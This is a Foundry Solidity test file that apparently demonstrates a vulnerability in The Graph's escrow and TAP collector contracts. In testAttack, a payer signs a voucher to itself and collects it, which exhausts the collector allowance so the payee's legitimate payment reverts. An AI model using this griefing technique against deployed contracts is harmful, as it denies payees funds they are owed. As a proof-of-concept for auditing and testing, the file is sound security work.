// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import { Test, console } from "forge-std/Test.sol";

import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import { GraphBaseTest } from "./GraphBase.t.sol";
import { IGraphPayments } from "../contracts/interfaces/IGraphPayments.sol";
import { IPaymentsEscrow } from "../contracts/interfaces/IPaymentsEscrow.sol";
import { ITAPCollector } from "../contracts/interfaces/ITAPCollector.sol";

contract Attack is GraphBaseTest {
    struct Harness {
        address payer;
        uint256 payerPk;
        address payee;
        uint256 allowance;
    }

    Harness harness;

    function setUp() public override {
        super.setUp();
        uint256 payerFunds = 100 ether;
        (address payer, uint256 payerPk) = makeAddrAndKey("payer");
        vm.deal({ account: payer, newBalance: 100 ether });
        deal({ token: address(token), to: payer, give: payerFunds });

        harness = Harness({ payer: payer, payerPk: payerPk, payee: makeAddr("payee"), allowance: 50 ether });

        // As the payer
        vm.startPrank(payer);

        // Authorize the signer for TAPCollector
        (uint256 proofDeadline, bytes32 digest) = authorizeSignerMessage(payer);
        tapCollector.authorizeSigner(payer, proofDeadline, compactSign(payerPk, digest)); // should really be signer and signerPk

        // Authorize the tap collector
        escrow.approveCollector(address(tapCollector), harness.allowance);

        // Setup an escrow between payer and payee
        token.approve(address(escrow), 50 ether);
        escrow.deposit(address(tapCollector), harness.payee, 50 ether);

        vm.stopPrank();
    }

    function compactSign(uint256 pk, bytes32 digest) public pure returns (bytes memory sig) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function authorizeSignerMessage(address authorizer) public view returns (uint256 proofDeadline, bytes32 digest) {
        proofDeadline = block.timestamp + 1;
        bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, proofDeadline, authorizer));
        digest = MessageHashUtils.toEthSignedMessageHash(messageHash);
        return (proofDeadline, digest);
    }

    // Issue RAV for self-collecting from payer by payee
    function issueRAV(
        address payee,
        uint256 value,
        uint256 payerPk
    ) public view returns (ITAPCollector.SignedRAV memory) {
        ITAPCollector.ReceiptAggregateVoucher memory rav = ITAPCollector.ReceiptAggregateVoucher({
            dataService: payee,
            serviceProvider: payee,
            timestampNs: 0,
            valueAggregate: uint128(value),
            metadata: new bytes(0)
        });

        return ITAPCollector.SignedRAV({ rav: rav, signature: compactSign(payerPk, tapCollector.encodeRAV(rav)) });
    }

    function collectableRAV(address payee, uint256 value, uint256 payerPk) public view returns (bytes memory) {
        return abi.encode(issueRAV(payee, value, payerPk), 0);
    }

    function testAttackInitialState() public {
        // As the payee
        vm.startPrank(harness.payee);

        uint256 expectedCollect = escrow.getBalance(harness.payer, address(tapCollector), harness.payee);
        assertGt(expectedCollect, 0);
        tapCollector.collect(
            IGraphPayments.PaymentTypes.QueryFee,
            collectableRAV(harness.payee, expectedCollect, harness.payerPk)
        );
        vm.stopPrank();
    }

    function testAttack() public {
        {
            // As the payer
            vm.startPrank(harness.payer);

            uint256 allowance = harness.allowance;
            assertGt(allowance, 0);

            // // Setup an escrow between payer and payer
            token.approve(address(escrow), allowance);
            escrow.deposit(address(tapCollector), harness.payer, allowance);

            // console.log("Amount in escrow: %d", escrowBalance(harness.payer, address(tapCollector), harness.payer));

            // Collect allowance
            tapCollector.collect(
                IGraphPayments.PaymentTypes.QueryFee,
                collectableRAV(harness.payer, allowance, harness.payerPk)
            );

            vm.stopPrank();
        }

        {
            // As the payee
            vm.startPrank(harness.payee);

            uint256 expectedCollect = escrow.getBalance(harness.payer, address(tapCollector), harness.payee);
            assertGt(expectedCollect, 0);

            bytes memory data = collectableRAV(harness.payee, expectedCollect, harness.payerPk);
            vm.expectRevert(
                abi.encodeWithSelector(IPaymentsEscrow.PaymentsEscrowInsufficientAllowance.selector, 0, expectedCollect)
            );
            tapCollector.collect(IGraphPayments.PaymentTypes.QueryFee, data);

            vm.stopPrank();
        }
    }

    function escrowBalance(address payer, address collector, address payee) private view returns (uint256 balance) {
        uint256 tokensThawing;
        uint256 thawEndTimestamp;
        (balance, tokensThawing, thawEndTimestamp) = escrow.escrowAccounts(payer, collector, payee);
        return balance;
    }
}
